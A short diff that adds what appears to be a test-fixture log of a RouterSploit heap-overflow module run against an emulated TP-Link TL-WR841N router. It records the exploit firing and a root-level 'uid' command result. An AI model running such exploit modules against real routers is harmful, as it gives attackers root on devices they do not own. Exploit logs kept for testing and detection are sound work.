@@ -1,0 +1,5 @@
+[*] Running module routersploit.modules.routers.tp_link.tl_wr841n_v14_96_boa0_9_3_heap_overflow (capture QEMU, fixture T-0202)
+[*] Exploit fired on 10.70.0.5:80 (boa 0.94.13, mipsle)
+[+] Command output (read_cmd=uid):
+uid=0(root) gid=0(root) groups=0(root)
+[*] Module finished in 12.4s
